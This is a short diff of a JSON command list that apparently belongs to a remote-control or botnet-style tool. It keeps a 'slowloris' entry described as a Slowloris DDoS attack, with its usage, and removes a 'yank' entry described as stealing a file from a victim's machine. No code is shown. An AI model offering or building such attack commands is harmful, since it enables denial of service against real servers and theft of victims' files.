@@ -38,10 +38,5 @@
         "command":"slowloris",
         "functionality":"Slowloris DDOS attack",
         "usage":"slowloris (ip) (port) (duration) (sockets)"
-    },
-    {
-        "command":"yank",
-        "functionality":"Steal a file from the victim's machine",
-        "usage":"yank (file name) (port)"
     }
 ]
